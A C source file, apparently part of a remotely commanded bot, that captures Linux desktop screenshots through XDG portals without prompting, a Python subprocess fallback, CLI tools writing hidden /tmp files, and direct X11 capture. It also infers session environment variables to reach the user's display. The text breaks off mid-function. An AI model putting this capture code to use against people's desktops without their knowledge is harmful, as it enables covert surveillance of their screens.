/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#if defined(__linux__) || defined(__unix__)

#include "screenshot.h"
#include "screenshot_encoder.h"
#include "screenshot_output.h"
#include "../config/config.h"
#include "../logging/logging.h"

#include <ctype.h>
#ifdef C2T_HAS_DBUS_ABI
#include <dbus/dbus.h>
#include <dlfcn.h>
#endif
#include <errno.h>
#include <limits.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <spawn.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <xcb/xcb.h>

extern char **environ;

static pthread_mutex_t display_lock = PTHREAD_MUTEX_INITIALIZER;
#ifdef C2T_HAS_DBUS_ABI
static atomic_uint portal_token_counter = 1;
#endif
static char selected_display_target[64] = "all";
static int selected_display_index = -1;

typedef struct {
  int id;
  int x;
  int y;
  uint16_t width;
  uint16_t height;
  int is_primary;
  char name[64];
} linux_display_info_t;

#define MAX_LINUX_DISPLAYS 16
static linux_display_info_t cached_displays[MAX_LINUX_DISPLAYS];
static int cached_display_count = 0;

static int is_wayland_session(void) {
  const char *wayland_disp = getenv("WAYLAND_DISPLAY");
  const char *session_type = getenv("XDG_SESSION_TYPE");
  if (wayland_disp && *wayland_disp) return 1;
  if (session_type && strcmp(session_type, "wayland") == 0) return 1;
  return 0;
}

static xcb_screen_t *get_screen(xcb_connection_t *conn, int screen_num) {
  const xcb_setup_t *setup = xcb_get_setup(conn);
  xcb_screen_iterator_t iter = xcb_setup_roots_iterator(setup);
  for (int i = 0; i < screen_num && iter.rem > 0; ++i) {
    xcb_screen_next(&iter);
  }
  return iter.data;
}

static int refresh_displays_x11(void) {
  const char *display = getenv("DISPLAY");
  if (!display || !*display) return 0;

  int screen_num = 0;
  xcb_connection_t *conn = xcb_connect(nullptr, &screen_num);
  if (xcb_connection_has_error(conn)) {
    xcb_disconnect(conn);
    return 0;
  }

  const xcb_setup_t *setup = xcb_get_setup(conn);
  xcb_screen_iterator_t iter = xcb_setup_roots_iterator(setup);
  cached_display_count = 0;

  int idx = 0;
  while (iter.rem > 0 && cached_display_count < MAX_LINUX_DISPLAYS) {
    xcb_screen_t *s = iter.data;
    if (s && s->width_in_pixels > 0 && s->height_in_pixels > 0) {
      cached_displays[cached_display_count].id = idx;
      cached_displays[cached_display_count].x = 0;
      cached_displays[cached_display_count].y = 0;
      cached_displays[cached_display_count].width = s->width_in_pixels;
      cached_displays[cached_display_count].height = s->height_in_pixels;
      cached_displays[cached_display_count].is_primary = (idx == screen_num);
      snprintf(cached_displays[cached_display_count].name,
               sizeof(cached_displays[cached_display_count].name),
               "X11 Screen :%d", idx);
      cached_display_count++;
    }
    idx++;
    xcb_screen_next(&iter);
  }

  xcb_disconnect(conn);
  return cached_display_count;
}

/* Fast helper to read an image file from disk and return its allocated buffer */
static int read_image_file_to_buffer(const char *filepath, void **out_data, size_t *out_size) {
  if (!filepath || !*filepath) return 0;

  FILE *fp = fopen(filepath, "rb");
  if (!fp) return 0;

  fseek(fp, 0, SEEK_END);
  long fsize = ftell(fp);
  fseek(fp, 0, SEEK_SET);

  if (fsize <= 0) {
    fclose(fp);
    return 0;
  }

  void *buf = malloc((size_t)fsize);
  if (!buf) {
    fclose(fp);
    return 0;
  }

  if (fread(buf, 1, (size_t)fsize, fp) != (size_t)fsize) {
    free(buf);
    fclose(fp);
    return 0;
  }

  fclose(fp);
  *out_data = buf;
  *out_size = (size_t)fsize;
  return 1;
}

static void ensure_desktop_session_env(void) {
  uid_t uid = getuid();
  char runtime_dir[128];
  snprintf(runtime_dir, sizeof(runtime_dir), "/run/user/%u", (unsigned int)uid);

  if (!getenv("XDG_RUNTIME_DIR") && access(runtime_dir, F_OK) == 0) {
    setenv("XDG_RUNTIME_DIR", runtime_dir, 0);
  }

  if (!getenv("DBUS_SESSION_BUS_ADDRESS")) {
    char bus_path[160];
    snprintf(bus_path, sizeof(bus_path), "unix:path=%s/bus", runtime_dir);
    if (access(runtime_dir, F_OK) == 0) {
      setenv("DBUS_SESSION_BUS_ADDRESS", bus_path, 0);
    }
  }

  if (!getenv("WAYLAND_DISPLAY")) {
    char wayland_sock[160];
    snprintf(wayland_sock, sizeof(wayland_sock), "%s/wayland-0", runtime_dir);
    if (access(wayland_sock, F_OK) == 0) {
      setenv("WAYLAND_DISPLAY", "wayland-0", 0);
    }
  }

  if (!getenv("DISPLAY")) {
    if (access("/tmp/.X11-unix/X0", F_OK) == 0) {
      setenv("DISPLAY", ":0", 0);
    } else if (access("/tmp/.X11-unix/X1", F_OK) == 0) {
      setenv("DISPLAY", ":1", 0);
    }
  }
}

#ifdef C2T_HAS_DBUS_ABI

#define C2T_DBUS_SYMBOLS(X)                                                   \
  X(dbus_threads_init_default)                                               \
  X(dbus_bus_add_match)                                                      \
  X(dbus_bus_get_private)                                                    \
  X(dbus_connection_close)                                                   \
  X(dbus_connection_dispatch)                                                \
  X(dbus_connection_flush)                                                   \
  X(dbus_connection_get_dispatch_status)                                     \
  X(dbus_connection_get_is_connected)                                       \
  X(dbus_connection_pop_message)                                            \
  X(dbus_connection_read_write)                                             \
  X(dbus_connection_send_with_reply_and_block)                              \
  X(dbus_connection_set_exit_on_disconnect)                                 \
  X(dbus_connection_unref)                                                   \
  X(dbus_error_free)                                                         \
  X(dbus_error_init)                                                         \
  X(dbus_error_is_set)                                                       \
  X(dbus_message_get_args)                                                   \
  X(dbus_message_has_path)                                                   \
  X(dbus_message_is_signal)                                                  \
  X(dbus_message_iter_append_basic)                                         \
  X(dbus_message_iter_close_container)                                      \
  X(dbus_message_iter_get_arg_type)                                         \
  X(dbus_message_iter_get_basic)                                            \
  X(dbus_message_iter_init)                                                  \
  X(dbus_message_iter_init_append)                                           \
  X(dbus_message_iter_next)                                                  \
  X(dbus_message_iter_open_container)                                       \
  X(dbus_message_iter_recurse)                                               \
  X(dbus_message_new_method_call)                                            \
  X(dbus_message_unref)

typedef struct {
  void *library;
#define C2T_DECLARE_DBUS_SYMBOL(name) __typeof__(name) *name;
  C2T_DBUS_SYMBOLS(C2T_DECLARE_DBUS_SYMBOL)
#undef C2T_DECLARE_DBUS_SYMBOL
  int available;
} c2t_dbus_api_t;

static c2t_dbus_api_t dbus_api;
static pthread_once_t dbus_api_once = PTHREAD_ONCE_INIT;

static void load_dbus_api_once(void) {
  static const char *const candidates[] = {
      "libdbus-1.so.3",
      "libdbus-1.so",
      nullptr,
  };
  for (size_t i = 0; candidates[i] && !dbus_api.library; ++i) {
    dbus_api.library = dlopen(candidates[i], RTLD_NOW | RTLD_LOCAL);
  }
  if (!dbus_api.library) return;

#define C2T_LOAD_DBUS_SYMBOL(name)                                           \
  do {                                                                       \
    void *symbol = dlsym(dbus_api.library, #name);                           \
    if (!symbol || sizeof(dbus_api.name) != sizeof(symbol)) goto unavailable;\
    memcpy(&dbus_api.name, &symbol, sizeof(dbus_api.name));                   \
  } while (0);
  C2T_DBUS_SYMBOLS(C2T_LOAD_DBUS_SYMBOL)
#undef C2T_LOAD_DBUS_SYMBOL

  dbus_api.available = 1;
  return;

unavailable:
  dlclose(dbus_api.library);
  memset(&dbus_api, 0, sizeof(dbus_api));
}

static int dbus_api_available(void) {
  pthread_once(&dbus_api_once, load_dbus_api_once);
  return dbus_api.available;
}

#define dbus_threads_init_default dbus_api.dbus_threads_init_default
#define dbus_bus_add_match dbus_api.dbus_bus_add_match
#define dbus_bus_get_private dbus_api.dbus_bus_get_private
#define dbus_connection_close dbus_api.dbus_connection_close
#define dbus_connection_dispatch dbus_api.dbus_connection_dispatch
#define dbus_connection_flush dbus_api.dbus_connection_flush
#define dbus_connection_get_dispatch_status dbus_api.dbus_connection_get_dispatch_status
#define dbus_connection_get_is_connected dbus_api.dbus_connection_get_is_connected
#define dbus_connection_pop_message dbus_api.dbus_connection_pop_message
#define dbus_connection_read_write dbus_api.dbus_connection_read_write
#define dbus_connection_send_with_reply_and_block dbus_api.dbus_connection_send_with_reply_and_block
#define dbus_connection_set_exit_on_disconnect dbus_api.dbus_connection_set_exit_on_disconnect
#define dbus_connection_unref dbus_api.dbus_connection_unref
#define dbus_error_free dbus_api.dbus_error_free
#define dbus_error_init dbus_api.dbus_error_init
#define dbus_error_is_set dbus_api.dbus_error_is_set
#define dbus_message_get_args dbus_api.dbus_message_get_args
#define dbus_message_has_path dbus_api.dbus_message_has_path
#define dbus_message_is_signal dbus_api.dbus_message_is_signal
#define dbus_message_iter_append_basic dbus_api.dbus_message_iter_append_basic
#define dbus_message_iter_close_container dbus_api.dbus_message_iter_close_container
#define dbus_message_iter_get_arg_type dbus_api.dbus_message_iter_get_arg_type
#define dbus_message_iter_get_basic dbus_api.dbus_message_iter_get_basic
#define dbus_message_iter_init dbus_api.dbus_message_iter_init
#define dbus_message_iter_init_append dbus_api.dbus_message_iter_init_append
#define dbus_message_iter_next dbus_api.dbus_message_iter_next
#define dbus_message_iter_open_container dbus_api.dbus_message_iter_open_container
#define dbus_message_iter_recurse dbus_api.dbus_message_iter_recurse
#define dbus_message_new_method_call dbus_api.dbus_message_new_method_call
#define dbus_message_unref dbus_api.dbus_message_unref

static int append_portal_option(DBusMessageIter *options, const char *name,
                                int value_type, const void *value,
                                const char *signature) {
  DBusMessageIter entry;
  DBusMessageIter variant;
  if (!dbus_message_iter_open_container(options, DBUS_TYPE_DICT_ENTRY,
                                         nullptr, &entry) ||
      !dbus_message_iter_append_basic(&entry, DBUS_TYPE_STRING, &name) ||
      !dbus_message_iter_open_container(&entry, DBUS_TYPE_VARIANT, signature,
                                         &variant) ||
      !dbus_message_iter_append_basic(&variant, value_type, value) ||
      !dbus_message_iter_close_container(&entry, &variant) ||
      !dbus_message_iter_close_container(options, &entry)) {
    return 0;
  }
  return 1;
}

static int hex_value(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

static int portal_uri_to_path(const char *uri, char *path, size_t path_size) {
  static const char prefix[] = "file://";
  if (!uri || strncmp(uri, prefix, sizeof(prefix) - 1) != 0 ||
      uri[sizeof(prefix) - 1] != '/' || !path || path_size == 0) {
    return 0;
  }

  const char *source = uri + sizeof(prefix) - 1;
  size_t used = 0;
  while (*source && used + 1 < path_size) {
    if (*source == '%') {
      int high = hex_value(source[1]);
      int low = source[1] ? hex_value(source[2]) : -1;
      if (high < 0 || low < 0) return 0;
      path[used++] = (char)((high << 4) | low);
      source += 3;
    } else {
      path[used++] = *source++;
    }
  }
  if (*source != '\0' || used == 0 || path[0] != '/') return 0;
  path[used] = '\0';
  return 1;
}

static int response_screenshot_path(DBusMessage *message, char *path,
                                    size_t path_size) {
  DBusMessageIter args;
  if (!dbus_message_iter_init(message, &args) ||
      dbus_message_iter_get_arg_type(&args) != DBUS_TYPE_UINT32) {
    return 0;
  }

  dbus_uint32_t response = 1;
  dbus_message_iter_get_basic(&args, &response);
  if (response != 0 || !dbus_message_iter_next(&args) ||
      dbus_message_iter_get_arg_type(&args) != DBUS_TYPE_ARRAY) {
    return 0;
  }

  DBusMessageIter entries;
  dbus_message_iter_recurse(&args, &entries);
  while (dbus_message_iter_get_arg_type(&entries) == DBUS_TYPE_DICT_ENTRY) {
    DBusMessageIter entry;
    dbus_message_iter_recurse(&entries, &entry);
    if (dbus_message_iter_get_arg_type(&entry) == DBUS_TYPE_STRING) {
      const char *key = nullptr;
      dbus_message_iter_get_basic(&entry, &key);
      if (key && strcmp(key, "uri") == 0 && dbus_message_iter_next(&entry) &&
          dbus_message_iter_get_arg_type(&entry) == DBUS_TYPE_VARIANT) {
        DBusMessageIter variant;
        dbus_message_iter_recurse(&entry, &variant);
        if (dbus_message_iter_get_arg_type(&variant) == DBUS_TYPE_STRING) {
          const char *uri = nullptr;
          dbus_message_iter_get_basic(&variant, &uri);
          return portal_uri_to_path(uri, path, path_size);
        }
      }
    }
    dbus_message_iter_next(&entries);
  }
  return 0;
}

/* Native XDG Desktop Portal call. Wayland deliberately exposes no direct
 * framebuffer API, so the compositor-authorized portal is the low-level path. */
static int capture_via_xdg_portal(void **out_data, size_t *out_size) {
  ensure_desktop_session_env();
  if (!dbus_api_available()) return 0;
  if (!dbus_threads_init_default()) return 0;

  DBusError error;
  dbus_error_init(&error);
  DBusConnection *connection = dbus_bus_get_private(DBUS_BUS_SESSION, &error);
  if (!connection) {
    if (dbus_error_is_set(&error)) dbus_error_free(&error);
    return 0;
  }
  dbus_connection_set_exit_on_disconnect(connection, FALSE);

  const char *match = "type='signal',interface='org.freedesktop.portal.Request',member='Response'";
  dbus_bus_add_match(connection, match, &error);
  dbus_connection_flush(connection);
  if (dbus_error_is_set(&error)) {
    dbus_error_free(&error);
    if (dbus_connection_get_is_connected(connection)) {
      dbus_connection_close(connection);
    }
    dbus_connection_unref(connection);
    return 0;
  }

  DBusMessage *request = dbus_message_new_method_call(
      "org.freedesktop.portal.Desktop", "/org/freedesktop/portal/desktop",
      "org.freedesktop.portal.Screenshot", "Screenshot");
  if (!request) goto cleanup_connection;

  DBusMessageIter args;
  DBusMessageIter options;
  dbus_message_iter_init_append(request, &args);
  const char *parent_window = "";
  dbus_bool_t interactive = FALSE;
  char token[64];
  snprintf(token, sizeof(token), "c2t_%lu_%u", (unsigned long)getpid(),
           atomic_fetch_add_explicit(&portal_token_counter, 1,
                                     memory_order_relaxed));
  const char *token_ptr = token;

  if (!dbus_message_iter_append_basic(&args, DBUS_TYPE_STRING,
                                       &parent_window) ||
      !dbus_message_iter_open_container(&args, DBUS_TYPE_ARRAY, "{sv}",
                                         &options) ||
      !append_portal_option(&options, "interactive", DBUS_TYPE_BOOLEAN,
                            &interactive, DBUS_TYPE_BOOLEAN_AS_STRING) ||
      !append_portal_option(&options, "handle_token", DBUS_TYPE_STRING,
                            &token_ptr, DBUS_TYPE_STRING_AS_STRING) ||
      !dbus_message_iter_close_container(&args, &options)) {
    dbus_message_unref(request);
    goto cleanup_connection;
  }

  DBusMessage *reply = dbus_connection_send_with_reply_and_block(
      connection, request, 3000, &error);
  dbus_message_unref(request);
  if (!reply) {
    if (dbus_error_is_set(&error)) dbus_error_free(&error);
    goto cleanup_connection;
  }

  const char *request_path = nullptr;
  if (!dbus_message_get_args(reply, &error, DBUS_TYPE_OBJECT_PATH,
                             &request_path, DBUS_TYPE_INVALID) ||
      !request_path) {
    if (dbus_error_is_set(&error)) dbus_error_free(&error);
    dbus_message_unref(reply);
    goto cleanup_connection;
  }
  char expected_path[DBUS_MAXIMUM_NAME_LENGTH + 1];
  snprintf(expected_path, sizeof(expected_path), "%s", request_path);
  dbus_message_unref(reply);

  int remaining_ms = 4000;
  while (remaining_ms > 0 && dbus_connection_get_is_connected(connection)) {
    int slice_ms = remaining_ms < 100 ? remaining_ms : 100;
    (void)dbus_connection_read_write(connection, slice_ms);
    remaining_ms -= slice_ms;

    while (dbus_connection_dispatch(connection) == DBUS_DISPATCH_DATA_REMAINS) {
    }

    DBusMessage *message;
    while ((message = dbus_connection_pop_message(connection)) != nullptr) {
      int matching_response = dbus_message_is_signal(
          message, "org.freedesktop.portal.Request", "Response") &&
          dbus_message_has_path(message, expected_path);
      if (matching_response) {
        char captured_path[PATH_MAX];
        int got_path = response_screenshot_path(message, captured_path,
                                                sizeof(captured_path));
        dbus_message_unref(message);
        int captured = got_path && read_image_file_to_buffer(
                                       captured_path, out_data, out_size);
        if (got_path) unlink(captured_path);
        if (captured) {
          if (dbus_connection_get_is_connected(connection)) {
            dbus_connection_close(connection);
          }
          dbus_connection_unref(connection);
          return 1;
        }
        goto cleanup_connection;
      }
      dbus_message_unref(message);
    }
  }

cleanup_connection:
  if (dbus_connection_get_is_connected(connection)) {
    dbus_connection_close(connection);
  }
  dbus_connection_unref(connection);
  return 0;
}

static int finalize_portal_capture(void **out_data, size_t *out_size,
                                   const char **out_mime_type,
                                   const char **out_filename,
                                   const char *backend_name) {
  if (!out_data || !*out_data || !out_size || *out_size == 0)
    return 0;

  c2t_image_format_t format = screenshot_get_format();
  int quality = screenshot_get_quality();
  if (quality <= 0) quality = 85;

  if (format != C2T_IMAGE_FORMAT_PNG) {
    void *trans_data = nullptr;
    size_t trans_size = 0;
    if (screenshot_transcode_image(*out_data, *out_size, format, quality,
                                   &trans_data, &trans_size)) {
      free(*out_data);
      *out_data = trans_data;
      *out_size = trans_size;
    }
  }

  if (out_mime_type) *out_mime_type = screenshot_format_mime(format);
  if (out_filename) *out_filename = screenshot_format_filename(format);

  c2t_log_info("screenshot",
               "Captured Linux Wayland desktop screenshot via %s (%zu bytes %s)",
               backend_name, *out_size, screenshot_format_to_string(format));
  return 1;
}

static int capture_via_portal(void **out_data, size_t *out_size,
                              const char **out_mime_type,
                              const char **out_filename) {
  if (!capture_via_xdg_portal(out_data, out_size)) return 0;
  return finalize_portal_capture(out_data, out_size, out_mime_type,
                                 out_filename, "native XDG Portal");
}

#else

static int finalize_portal_capture(void **out_data, size_t *out_size,
                                   const char **out_mime_type,
                                   const char **out_filename,
                                   const char *backend_name) {
  if (!out_data || !*out_data || !out_size || *out_size == 0)
    return 0;

  c2t_image_format_t format = screenshot_get_format();
  int quality = screenshot_get_quality();
  if (quality <= 0) quality = 85;

  if (format != C2T_IMAGE_FORMAT_PNG) {
    void *trans_data = nullptr;
    size_t trans_size = 0;
    if (screenshot_transcode_image(*out_data, *out_size, format, quality,
                                   &trans_data, &trans_size)) {
      free(*out_data);
      *out_data = trans_data;
      *out_size = trans_size;
    }
  }

  if (out_mime_type) *out_mime_type = screenshot_format_mime(format);
  if (out_filename) *out_filename = screenshot_format_filename(format);

  c2t_log_info("screenshot",
               "Captured Linux Wayland desktop screenshot via %s (%zu bytes %s)",
               backend_name, *out_size, screenshot_format_to_string(format));
  return 1;
}

static int capture_via_portal(void **out_data, size_t *out_size,
                              const char **out_mime_type,
                              const char **out_filename) {
  (void)out_data;
  (void)out_size;
  (void)out_mime_type;
  (void)out_filename;
  return 0;
}

#endif

/* Last-resort Wayland fallback. It intentionally stays outside the normal
 * path: no shell is involved and Python is started only after native portal
 * capture has failed. */
static int capture_via_python_portal(void **out_data, size_t *out_size,
                                     const char **out_mime_type,
                                     const char **out_filename) {
  static const char script[] =
      "import dbus, urllib.parse, sys, time\n"
      "from dbus.mainloop.glib import DBusGMainLoop\n"
      "from gi.repository import GLib\n"
      "DBusGMainLoop(set_as_default=True)\n"
      "try:\n"
      " bus=dbus.SessionBus(); loop=GLib.MainLoop()\n"
      " def done(code,data):\n"
      "  if code==0 and 'uri' in data:\n"
      "   uri=str(data['uri']); print(urllib.parse.unquote(uri[7:]) if uri.startswith('file://') else uri, flush=True)\n"
      "  loop.quit()\n"
      " portal=bus.get_object('org.freedesktop.portal.Desktop','/org/freedesktop/portal/desktop')\n"
      " iface=dbus.Interface(portal,'org.freedesktop.portal.Screenshot')\n"
      " token='c2t_py_%d_%d' % (time.time_ns(), id(loop))\n"
      " request=iface.Screenshot('',{'interactive':dbus.Boolean(False),'handle_token':dbus.String(token)})\n"
      " bus.add_signal_receiver(done,signal_name='Response',dbus_interface='org.freedesktop.portal.Request',path=request)\n"
      " GLib.timeout_add_seconds(15,loop.quit); loop.run()\n"
      "except Exception:\n"
      " sys.exit(1)\n";

  ensure_desktop_session_env();
  int output_pipe[2];
  if (pipe(output_pipe) != 0) return 0;

  posix_spawn_file_actions_t actions;
  int spawn_error = posix_spawn_file_actions_init(&actions);
  int actions_initialized = spawn_error == 0;
  if (spawn_error == 0)
    spawn_error = posix_spawn_file_actions_addclose(&actions, output_pipe[0]);
  if (spawn_error == 0)
    spawn_error = posix_spawn_file_actions_adddup2(
        &actions, output_pipe[1], STDOUT_FILENO);
  if (spawn_error == 0)
    spawn_error = posix_spawn_file_actions_addclose(&actions, output_pipe[1]);

  char *const arguments[] = {(char *)"python3", (char *)"-c",
                             (char *)script, nullptr};
  pid_t child = -1;
  if (spawn_error == 0)
    spawn_error = posix_spawnp(&child, arguments[0], &actions, nullptr,
                               arguments, environ);
  if (actions_initialized) posix_spawn_file_actions_destroy(&actions);
  if (spawn_error != 0) {
    close(output_pipe[0]);
    close(output_pipe[1]);
    return 0;
  }

  close(output_pipe[1]);
  char captured_path[PATH_MAX] = {};
  size_t used = 0;
  int remaining_ms = 20000;
  int child_status = 0;
  int child_finished = 0;
  while (remaining_ms > 0 && used + 1 < sizeof(captured_path)) {
    struct pollfd descriptor = {
        .fd = output_pipe[0], .events = POLLIN | POLLHUP, .revents = 0};
    int slice_ms = remaining_ms < 250 ? remaining_ms : 250;
    int ready = poll(&descriptor, 1, slice_ms);
    remaining_ms -= slice_ms;
    if (ready > 0 && (descriptor.revents & (POLLIN | POLLHUP))) {
      ssize_t count = read(output_pipe[0], captured_path + used,
                           sizeof(captured_path) - used - 1);
      if (count > 0) {
        used += (size_t)count;
        captured_path[used] = '\0';
        if (strchr(captured_path, '\n')) break;
      } else if (count == 0) {
        break;
      }
    } else if (ready < 0 && errno != EINTR) {
      break;
    }
    pid_t waited = waitpid(child, &child_status, WNOHANG);
    if (waited == child) {
      child_finished = 1;
      if (used == 0) break;
    }
  }
  close(output_pipe[0]);

  if (!child_finished) {
    pid_t waited = waitpid(child, &child_status, WNOHANG);
    child_finished = waited == child;
    for (unsigned int attempt = 0; !child_finished && attempt < 20;
         ++attempt) {
      struct timespec delay = {.tv_sec = 0, .tv_nsec = 50000000L};
      while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
      }
      waited = waitpid(child, &child_status, WNOHANG);
      child_finished = waited == child;
    }
    if (!child_finished) {
      kill(child, SIGKILL);
      while (waitpid(child, &child_status, 0) < 0 && errno == EINTR) {
      }
    }
  }

  char *line_end = strpbrk(captured_path, "\r\n");
  if (line_end) *line_end = '\0';
  if (!captured_path[0]) return 0;

  int captured = read_image_file_to_buffer(captured_path, out_data, out_size);
  unlink(captured_path);
  if (!captured) return 0;

  return finalize_portal_capture(out_data, out_size, out_mime_type,
                                 out_filename, "Python XDG Portal fallback");
}

static int capture_via_cli_tool(void **out_data, size_t *out_size,
                                const char **out_mime_type,
                                const char **out_filename) {
  ensure_desktop_session_env();
  char tmp_path[64];
  snprintf(tmp_path, sizeof(tmp_path), "/tmp/.c2t_shot_%ld_%u.png",
           (long)getpid(), (unsigned int)(rand() & 0xffff));

  int is_wayland = is_wayland_session();

  struct {
    const char *tool;
    int wayland_only;
    int x11_only;
    char *const args[8];
  } candidates[] = {
      {"grim", 1, 0, {(char *)"grim", tmp_path, nullptr}},
      {"spectacle", 0, 0,
       {(char *)"spectacle", (char *)"-b", (char *)"-n", (char *)"-o",
        tmp_path, nullptr}},
      {"maim", 0, 1, {(char *)"maim", tmp_path, nullptr}},
      {"scrot", 0, 1, {(char *)"scrot", (char *)"-z", tmp_path, nullptr}},
      {"import", 0, 1,
       {(char *)"import", (char *)"-window", (char *)"root", tmp_path,
        nullptr}},
      {nullptr, 0, 0, {nullptr}}};

  for (size_t i = 0; candidates[i].tool; ++i) {
    if (is_wayland && candidates[i].x11_only)
      continue;
    if (!is_wayland && candidates[i].wayland_only)
      continue;

    unlink(tmp_path);
    pid_t pid = -1;
    int err = posix_spawnp(&pid, candidates[i].tool, nullptr, nullptr,
                           candidates[i].args, environ);
    if (err != 0 || pid <= 0)
      continue;

    int status = 0;
    int finished = 0;
    for (int t = 0; t < 25; ++t) {
      pid_t p = waitpid(pid, &status, WNOHANG);
      if (p == pid) {
        finished = 1;
        break;
      }
      struct timespec ts = {.tv_sec = 0, .tv_nsec = 100000000L};
      nanosleep(&ts, nullptr);
    }
    if (!finished) {
      kill(pid, SIGKILL);
      waitpid(pid, &status, 0);
    } else if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      if (access(tmp_path, F_OK) == 0) {
        if (read_image_file_to_buffer(tmp_path, out_data, out_size)) {
          unlink(tmp_path);
          if (screenshot_is_image_all_black(*out_data, *out_size)) {
            c2t_log_warning("screenshot",
                            "CLI tool '%s' returned a solid black image; discarding",
                            candidates[i].tool);
            free(*out_data);
            *out_data = nullptr;
            *out_size = 0;
            continue;
          }
          return finalize_portal_capture(out_data, out_size, out_mime_type,
                                         out_filename, candidates[i].tool);
        }
      }
    }
    unlink(tmp_path);
  }
  unlink(tmp_path);
  return 0;
}

static int is_all_black_raw_pixels(const uint8_t *pixels, uint32_t width,
                                   uint32_t height) {
  if (!pixels || width == 0 || height == 0)
    return 1;
  size_t total_pixels = (size_t)width * height;
  size_t non_zero = 0;
  size_t step = total_pixels > 10000 ? 16 : 1;
  for (size_t i = 0; i < total_pixels; i += step) {
    uint8_t b = pixels[i * 4 + 0];
    uint8_t g = pixels[i * 4 + 1];
    uint8_t r = pixels[i * 4 + 2];
    if (r > 3 || g > 3 || b > 3) {
      non_zero++;
      if (non_zero > 10)
        return 0;
    }
  }
  return 1;
}

int screenshot_capture_x11(void **out_data, size_t *out_size,
                           const char **out_mime_type,
                           const char **out_filename) {
  return screenshot_capture_display("all", out_data, out_size, out_mime_type,
                                    out_filename);
}

int screenshot_capture_linux_display(const char *target, void **out_data,
                                     size_t *out_size,
                                     const char **out_mime_type,
                                     const char **out_filename) {
  if (!out_data || !out_size || !out_mime_type || !out_filename) {
    return 0;
  }
  *out_data = nullptr;
  *out_size = 0;

  int is_wayland = is_wayland_session();

  /* 1. If Wayland, native XDG Portal and Python Portal are primary */
  if (is_wayland) {
    if (capture_via_portal(out_data, out_size, out_mime_type, out_filename)) {
      return 1;
    }
    if (capture_via_python_portal(out_data, out_size, out_mime_type,
                                  out_filename)) {
      return 1;
    }
    if (capture_via_cli_tool(out_data, out_size, out_mime_type,
                             out_filename)) {
      return 1;
    }
  }

  /* 2. Try native X11 / XCB direct capture if DISPLAY is present */
  const char *display = getenv("DISPLAY");
  if (display && *display) {
    int target_idx = -1;
    if (target && *target && strcmp(target, "all") != 0 &&
        strcmp(target, "*") != 0) {
      target_idx = atoi(target);
    }

    int screen_num = (target_idx >= 0) ? target_idx : 0;
    xcb_connection_t *conn = xcb_connect(nullptr, &screen_num);
    if (!xcb_connection_has_error(conn)) {
      xcb_screen_t *screen = get_screen(conn, screen_num);
      if (!screen) {
        screen = get_screen(conn, 0);
      }
      if (screen && screen->width_in_pixels > 0 &&
          screen->height_in_pixels > 0) {
        uint16_t width = screen->width_in_pixels;
        uint16_t height = screen->height_in_pixels;

        xcb_get_image_cookie_t cookie =
            xcb_get_image(conn, XCB_IMAGE_FORMAT_Z_PIXMAP, screen->root, 0, 0,
                          width, height, ~0);
        xcb_get_image_reply_t *reply =
            xcb_get_image_reply(conn, cookie, nullptr);
        if (reply) {
          int data_len = xcb_get_image_data_length(reply);
          uint8_t *pixel_data = xcb_get_image_data(reply);
          if (pixel_data && data_len > 0) {
            if (is_all_black_raw_pixels(pixel_data, width, height)) {
              c2t_log_warning(
                  "screenshot",
                  "XCB capture returned solid black image; discarding");
            } else {
              c2t_image_format_t format = screenshot_get_format();
              int quality = screenshot_get_quality();
              if (quality <= 0)
                quality = 85;

              void *img_buf = nullptr;
              size_t img_size = 0;
              if (screenshot_encode_image(format, (uint32_t)width,
                                          (uint32_t)height, pixel_data, 1,
                                          quality, &img_buf, &img_size)) {
                free(reply);
                xcb_disconnect(conn);
                *out_data = img_buf;
                *out_size = img_size;
                *out_mime_type = screenshot_format_mime(format);
                *out_filename = screenshot_format_filename(format);
                c2t_log_info("screenshot",
                             "Captured %ux%u Linux X11 desktop screenshot (%zu "
                             "bytes %s)",
                             width, height, img_size,
                             screenshot_format_to_string(format));
                return 1;
              }
            }
          }
          free(reply);
        }
      }
      xcb_disconnect(conn);
    }
  }

  /* 3. Try CLI tools if not on Wayland or if prior steps failed */
  if (capture_via_cli_tool(out_data, out_size, out_mime_type, out_filename)) {
    return 1;
  }

  /* 4. Portal fallbacks for X11 sessions */
  if (!is_wayland) {
    if (capture_via_portal(out_data, out_size, out_mime_type, out_filename)) {
      return 1;
    }
    if (capture_via_python_portal(out_data, out_size, out_mime_type,
                                  out_filename)) {
      return 1;
    }
  }

  c2t_log_warning(
      "screenshot",
      "Linux capture methods (XDG Desktop Portal, Python Portal, CLI tools, "
      "and X11/XCB) all failed");
  return 0;
}

int screenshot_get_display_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return 0;

  pthread_mutex_lock(&display_lock);
  refresh_displays_x11();

  const char *backend = is_wayland_session() ? "Wayland" : "X11";

  if (cached_display_count == 0) {
    snprintf(buffer, max_len,
             "🖥️ <b>Connected Displays (%s):</b>\n\n"
             "• <b>[all]</b> <i>Virtual Desktop / Primary Display</i> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             backend, selected_display_target);
    pthread_mutex_unlock(&display_lock);
    return 1;
  }

  size_t offset = (size_t)snprintf(
      buffer, max_len, "🖥️ <b>Detected Displays — %s (%d):</b>\n\n",
      backend, cached_display_count);

  for (int i = 0; i < cached_display_count && offset + 128 < max_len; ++i) {
    int active = (selected_display_index == i) || (selected_display_index == -1);
    offset += (size_t)snprintf(
        buffer + offset, max_len - offset,
